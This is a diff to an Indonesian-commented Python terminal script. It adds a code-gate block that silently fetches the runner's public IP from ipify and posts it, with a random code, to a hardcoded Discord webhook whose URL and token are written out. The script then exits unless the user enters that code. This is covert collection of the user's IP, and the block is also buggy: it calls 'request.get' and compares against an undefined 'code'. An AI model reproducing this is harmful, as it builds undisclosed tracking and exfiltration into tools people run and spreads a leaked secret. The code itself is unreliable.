@@ -30,6 +30,21 @@ time.sleep(1)
 os.system("clear")
 os.system("xdg-open https://youtube.com/channel/UC2mLQ18pngyrc7Rs3ElnpQw")
 print("\033[1;32m√ \033[1;37mDon't Abuse \033[1;36m>_<")
+import random, requests
+from dhooks import Webhook
+
+codes = random.randint(0,999) #Proses Code Random
+ip1 = request.get("https://api.ipify.org/").text #Tracker IP VPS
+hook = Webhook("https://discord.com/api/webhooks/941984157326798868/D3e8qlO1O3Lhaw5wtbVUSrTtz82Qg709UDKMTa5DEHyTIuLdCLXGVlLW-hFhPjlUVXE_") #LINK WEBHOOK UNTUK SEND SEBUAH OBJEK
+hook.send(f"\nIP Address : {ip1}\nCode : {codes}\n") #GUNA NYA MENGIRIM KE LINK WEBHOOK
+passw = int(input("Enter Code : "))
+
+if passw == code: # JIKA CODE BENAR
+ print("CodeIs  Correct")
+
+else: # JIKA CODE SALAH ATAU BERBEDA DARI OBJEK CODES
+ print("Wrong Code Is Detected")
+ exit()
 time.sleep(10)
 os.system('clear')
 print("\033[91m")
